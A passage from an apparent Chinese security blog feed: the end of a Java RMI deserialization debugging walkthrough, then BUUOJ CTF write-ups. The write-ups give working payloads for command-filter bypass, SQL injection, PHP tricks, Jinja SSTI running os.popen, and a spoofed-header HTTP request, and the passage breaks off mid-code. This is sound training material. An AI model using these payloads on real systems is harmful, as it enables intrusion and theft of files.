往后直接创建了动态代理</p><p>跟进去看一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607185801158.png" alt="image-20240607185801158"></p><p>这里使用<code>forname</code>反射创建</p><p>一路F8, 回到<code>createProxy</code>的地方, 下面就是<code>setSkeleton</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607190052291.png" alt="image-20240607190052291"></p><p>顾名思义就是创建<code>Skeleton</code>骨架</p><p>再往后就是创建<code>Target</code>与之前相同 F8跳过</p><p>直到一步<code>super.exportObject()</code>进去</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607212901501.png" alt="image-20240607212901501"></p><p>这里也和之前类似, 把封装的 target put到一个table里, 我们可以跟进去putTarget看一下, 去之前的操作是类似的</p><p>我们F8把这些流程走完, 之后就是保存了一些数据</p><p>我们再来看绑定是如何实现的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240608115147520.png" alt="image-20240608115147520"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240608115313738.png" alt="image-20240608115313738"></p><p>这里首先检查bindings这个hashTable是否为空, 若空则把远程对象的引用放进去(ip 端口)</p><p>比较简单的一个过程</p><p>这里我也画了一个大致的流程图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/RMI_Registry_2.jpg" alt="RMI_Registry_2"></p><h3 id="客户端调用注册中心"><a href="#客户端调用注册中心" class="headerlink" title="客户端调用注册中心"></a>客户端调用注册中心</h3><p>前面都是很安全的操作, 到这一步, 如之前抓包所说, 存在反序列化的操作, 因此这里是受威胁的</p><h4 id="获取注册中心"><a href="#获取注册中心" class="headerlink" title="获取注册中心"></a>获取注册中心</h4><p>这个过程去创建注册中心是高度相似的, 就不做展示了</p><p>我们快速过完后就会发现这里已经获取到注册中心的stub了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609152349355.png" alt="image-20240609152349355"></p><h4 id="lookup查找远程对象"><a href="#lookup查找远程对象" class="headerlink" title="lookup查找远程对象"></a>lookup查找远程对象</h4><p>很可惜这里有一部分是.class文件,没法调试, 在lookup处打断点会跳转到别的地方</p><p>不过问题不大, 我们先F8找到lookup处</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609153619883.png" alt="image-20240609153619883"></p><p>注意这里的<code>var3.writeObject(var1);</code>var1是lookup的参数, 也就是<code>hello</code>这里被反序列化后传了进去, 在这之后registry会反序列化读取, 这就造成了威胁</p><p>后面就是<code>super.ref.invoke(var2);</code>这里<code>super.ref</code>就是<code>UnicastRef</code>这个类, 我们直接去这个类下的invoke打断点</p><p>之后就可以跳转到这个方法中, 这里是可以调试的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609160036017.png" alt="image-20240609160036017"></p><p>这里的 <code>invoke()</code> 方法是类似于激活的方法</p><p><code>invoke</code>里会调用<code>call.executeCall();</code>它是真正处理网络请求的方法，也就是客户端的网络请求都是通过这个方法实现的。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161551640.png" alt="image-20240609161551640"></p><p>这里往下会有一处<code>ReadObject</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161525554.png" alt="image-20240609161525554"></p><p><code>in</code>是在这里创建的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161732711.png" alt="image-20240609161732711"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161757770.png" alt="image-20240609161757770"></p><p>不难理解，in 就是数据流里面的东西。</p><blockquote><p>这里获取异常的本意应该是在报错的时候把一整个信息都拿出来，这样会更清晰一点，但是这里就出问题了 ———— 如果一个注册中心返回一个恶意的对象，客户端进行反序列化，这就会导致漏洞。这里的漏洞相比于其他漏洞更为隐蔽。</p><ul><li>也就是说，只要调用 <code>invoke()</code>，就会导致漏洞。RMI 在设计之初就并未考虑到这个问题，导致客户端都是易受攻击的。</li></ul></blockquote><p>之后走完这个过程, 结束后我们就会获取到远程对象的动态代理, 其中包含了它的ref, 明确其开放的端口</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609162034596.png" alt="image-20240609162034596"></p><h4 id="客户端请求服务端"><a href="#客户端请求服务端" class="headerlink" title="客户端请求服务端"></a>客户端请求服务端</h4><p>对应了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ihello.sayHello(<span class="string">&quot;hello, n4c1!&quot;</span>);</span><br></pre></td></tr></table></figure><p>由于ihello是一个动态代理, 因此我们会跳到它的handler的invoke方法中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609162755645.png" alt="image-20240609162755645"></p><p>这些if都不太重要, 主要是后面的</p><p>return invokeRemoteMethod(proxy, method, args);</p><p>这里看名字就知道是执行远程类的方法跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609164451084.png" alt="image-20240609164451084"></p><p>到这里的<code>ref.invoke</code>继续跟进</p><p>我们往下走到这一步</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609164746609.png" alt="image-20240609164746609"></p><p>跟进去</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609165026740.png" alt="image-20240609165026740"></p><p>这里会将我们传给调用方法的参数序列化写进out里</p><p>之后再往下走就又到了<code>call.executeCall()</code>,即每进行一次网络请求都会调用<code>call.executeCall()</code>这个方法, 当然这里面是易受攻击的</p><p>我们继续往下, 就到了<code>unmarshalValue</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609165448317.png" alt="image-20240609165448317"></p><p>这个方法与<code>marshalValue</code>类似, 但这个是<code>readObject</code>反序列化把connection中的数据读回来</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609165903310.png" alt="image-20240609165903310"></p><p>因此这里也是易受攻击的</p><p>到这里这一块基本上就结束了</p><h3 id="客户端发起请求，注册中心如何处理"><a href="#客户端发起请求，注册中心如何处理" class="headerlink" title="客户端发起请求，注册中心如何处理"></a>客户端发起请求，注册中心如何处理</h3><p>断点打在下面这个位置,  找不到的话打开rt.jar(java核心类)</p><p>在sun.rmi.Transport.Transport.java中的<code>serviceCall</code>方法中.  </p><p>先debug服务端, 再运行客户端就可以断在这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609183403670.png" alt="image-20240609183403670"></p><p>F8过这条, 我们看Target中, 有一个Stub, 里面有一个ref对应着1099端口</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609200115650.png" alt="image-20240609200115650"></p><p>再往下看<code>final Dispatcher disp = target.getDispatcher();</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609200944126.png" alt="image-20240609200944126"></p><p>这里是将 Target.disp(对应着<code>skel</code>) 的值放到 disp 里面。</p><p>继续往下走, 有一个<code>disp.dispatch(impl, call);</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609201951099.png" alt="image-20240609201951099"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609202110937.png" alt="image-20240609202110937"></p><p>继续跟进这个<code>oldDispatch</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609202255595.png" alt="image-20240609202255595"></p><p>注意这里又没法调试了, 代码会乱跳</p><p>我们需要把断点打在<code>sun.rmi.registry</code>包下的<code>RegistryImpl_Skel</code>类的<code>dispatch</code>方法中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609202852918.png" alt="image-20240609202852918"></p><p>这段代码是用来判断客户端向registry发起的请求方式的</p><p>有以下几种,以及其对应的编号</p><ul><li>0-&gt;bind</li><li>1-&gt;list</li><li>2-&gt;lookup</li><li>3-&gt;rebind</li><li>4-&gt;unbind</li></ul><p>只要对印的case中有反序列化就是易受攻击的</p><p>例如</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609203336416.png" alt="image-20240609203336416"></p><p>实际上除了list都是可以攻击的</p><p>并且是客户端向registry发起攻击</p><h3 id="客户端发起请求，服务端如何处理"><a href="#客户端发起请求，服务端如何处理" class="headerlink" title="客户端发起请求，服务端如何处理"></a>客户端发起请求，服务端如何处理</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-RMI&quot;&gt;&lt;a href=&quot;#Java-RMI&quot; class=&quot;headerlink&quot; title=&quot;Java RMI&quot;&gt;&lt;/a&gt;Java RMI&lt;/h1&gt;&lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>buuoj一次刷个够</title>
    <link href="http://example.com/2024/05/30/buuoj%E4%B8%80%E6%AC%A1%E5%88%B7%E4%B8%AA%E5%A4%9F/"/>
    <id>http://example.com/2024/05/30/buuoj%E4%B8%80%E6%AC%A1%E5%88%B7%E4%B8%AA%E5%A4%9F/</id>
    <published>2024-05-30T05:51:33.000Z</published>
    <updated>2024-11-11T10:25:38.512Z</updated>
    
    <content type="html"><![CDATA[<h1 id="buuoj一次刷个够"><a href="#buuoj一次刷个够" class="headerlink" title="buuoj一次刷个够"></a>buuoj一次刷个够</h1><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>网上扒来源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>preg_match对原来的字符串没有开启多行匹配, PATH环境变量被改了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0a&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0a&#125;</span><br></pre></td></tr></table></figure><p>第二种解法时正则回溯最大次数绕过</p><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>布尔注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stunum=if(1,2,1)</span><br><span class="line">stunum=1^2</span><br></pre></td></tr></table></figure><p>两种手法都能测出来, 之后就是编写脚本, 这里就不浪费时间了</p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b%20u%20p%20t=23333%0a</span><br></pre></td></tr></table></figure><p>到secrettw.php</p><p>源码里有一点jsFuck, 运行一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240530144140854.png" alt="image-20240530144140854"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>换ip用Client-IP: 127.0.0.1, 不过这里不回显ip, 但确实已经换掉了</p><p>之后是反算这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span>(<span class="params"><span class="variable">$v</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$re</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unchange</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d3663114-3245-44e1-9628-79b302dcc843.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Client-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>20</span><br><span class="line"></span><br><span class="line"><span class="language-applescript">todat <span class="keyword">is</span> a happy <span class="built_in">day</span></span></span><br></pre></td></tr></table></figure><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题之前已经见过了, 直接看payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%ff?source</span><br></pre></td></tr></table></figure><p>basename会返回config.php这个字符串, 利用%ff绕过preg_match </p><blockquote><p>网址：<a href="https://www.example.com/php/index.php/test/foo?username=root">https://www.example.com/php/index.php/test/foo?username=root</a></p><p>$_SERVER[‘PHP_SELF’] 得到：&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo<br>$_SERVER[‘SCRIPT_NAME’] 得到：&#x2F;php&#x2F;index.php<br>$_SERVER[‘REQUEST_URI’] 得到：&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo?username&#x3D;root</p></blockquote><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>Fenjin秒了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler.next[&#x27;__g&#x27;&#x27;lobals__&#x27;].__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span 